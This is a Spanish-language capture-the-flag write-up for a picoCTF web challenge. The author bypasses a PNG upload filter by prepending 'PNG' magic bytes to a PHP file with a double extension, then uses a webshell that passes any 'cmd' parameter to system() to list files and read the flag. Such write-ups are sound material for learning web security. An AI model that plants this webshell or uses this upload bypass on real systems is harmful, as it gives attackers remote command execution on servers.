---
### Descripción:
**I found a web app that can help process images: PNG images only!
Additional details will be available after launching your challenge instance.
Try it [here](http://atlas.picoctf.net:58786/)!**


### Pistas: 
```
(None)
```

### Solución:
- **Para la solucion a este reto, entraremos a la pagina que nos dieron, de la cual, solo acepta imagenes png; comenzamos colocando, robots.txt al final de la liga: "http://atlas.picoctf.net:55481/robots.txt", obtendremos:**
```bash
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
- **Al intentar dirigirnos a /instructions.txt, nos dira lo siguiente.**
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
- **En resumen, la informacion de que los bytes de un archivo PNG en hexadecimal son "50 4E 47", y nos servira para despues.**
- **A continuacion investigamos sobre el webshell en php (en chatgpt), y del cual obtendremos lo siguiente:**
```bash
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
```
- **A partir de esta informacion, nos dirigimos a la terminal y haremos un archivo php, donde guardaremos lo investigado.**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ nano webshell.php
```
- **Sin embargo, no nos sirve con esta extension ya que no lo detectara como png, por lo que hacemos una copia, o simplemente, editamos el archivo y al principio del texto que copiamos colocamos "PNG".**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ cp webshell.php  webshell.png.php
estefania@estefania-IdeaPad-3-14ALC6:~$ nano webshell.png.php
estefania@estefania-IdeaPad-3-14ALC6:~$ cat webshell.png.php 
PNG
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
```
- **Al leer los bytes del archivo con "xxd", al principio vemos los bytes que ocupamos para que se detecte que el archivo funcione como un PNG.**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ xxd webshell.png.php
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss
00000010: 6574 2824 5f52 4551 5545 5354 5b27 636d  et($_REQUEST['cm
00000020: 6427 5d29 297b 0a20 2020 2065 6368 6f20  d'])){.    echo 
00000030: 223c 7072 653e 223b 0a20 2020 2024 636d  "<pre>";.    $cm
00000040: 6420 3d20 2824 5f52 4551 5545 5354 5b27  d = ($_REQUEST['
00000050: 636d 6427 5d29 3b0a 2020 2020 7379 7374  cmd']);.    syst
00000060: 656d 2824 636d 6429 3b0a 2020 2020 6563  em($cmd);.    ec
00000070: 686f 2022 3c2f 7072 653e 223b 0a7d 0a    ho "</pre>";.}.
```
- **Ahora, hecho el archivo, lo subimos a la pagina, y nos dirigimos a "/uploads/webshell.png.php?cmd=ls", para ver el contenido, deberia aparecer el archivo php que subimos, no nos sirve, por lo que le añadimos ".." despues del ls, para ir una carpeta atras.**
```
http://atlas.picoctf.net:55481/uploads/webshell.png.php?cmd=ls 
http://atlas.picoctf.net:55481/uploads/webshell.png.php?cmd=ls%20..
```
- **Del cual nos aparece lo siguiente:**
```
PNG

GAZWIMLEGU2DQ.txt
index.php
instructions.txt
robots.txt
uploads
```
- **Vemos que el primer archivo txt es el unico que no hemos visto, por lo tanto editaremos la url, haciendole un cat al archivo de la siguiente manera:**
```
http://atlas.picoctf.net:55481/uploads/webshell.png.php?cmd=cat%20../GAZWIMLEGU2DQ.txt
```
- **Y finalmente obtenemos la bandera:**
```
PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548} */
```

### Bandera:
```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}
```
